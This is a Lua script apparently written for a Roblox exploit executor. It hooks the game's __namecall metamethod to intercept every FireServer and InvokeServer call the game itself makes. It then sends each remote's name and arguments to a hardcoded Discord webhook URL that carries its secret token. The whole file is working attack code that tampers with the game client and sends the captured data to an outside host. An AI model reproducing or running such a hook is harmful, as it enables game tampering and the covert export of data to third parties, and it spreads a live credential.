local WH = "https://discord.com/api/webhooks/1489564311423815720/95RTxCNmEopgkqiRY1n_jH5hxMFuNqCS5OYxppId3UE_QxdJWgXuMPbVoubeVDhp-AT6"
local http = (request or http_request or (http and http.request))
local hook = hookmetamethod
local logging = false -- This is our shield

local function logData(remote, args)
    if logging then return end -- If already logging, stop here
    logging = true
    
    local content = "📡 **FireServer Detected**\n**Remote:** `" .. tostring(remote) .. "`"
    local argStr = ""
    for i, v in pairs(args) do
        argStr = argStr .. "\n[" .. tostring(i) .. "]: " .. tostring(v)
    end
    
    task.spawn(function()
        pcall(function()
            http({
                Url = WH,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = game:GetService("HttpService"):JSONEncode({["content"] = content .. "\n**Args:**" .. argStr})
            })
        end)
        task.wait(0.5) -- Small delay to prevent spam
        logging = false -- Ready for the next log
    end)
end

local old
old = hook(game, "__namecall", function(self, ...)
    local method = getnamecallmethod()
    local args = {...}

    if not checkcaller() and (method == "FireServer" or method == "InvokeServer") then
        -- Only log if it's NOT our own webhook request
        logData(self.Name, args)
    end

    return old(self, ...)
end)

print("🚀 Interceptor with Recursion Shield Active!")
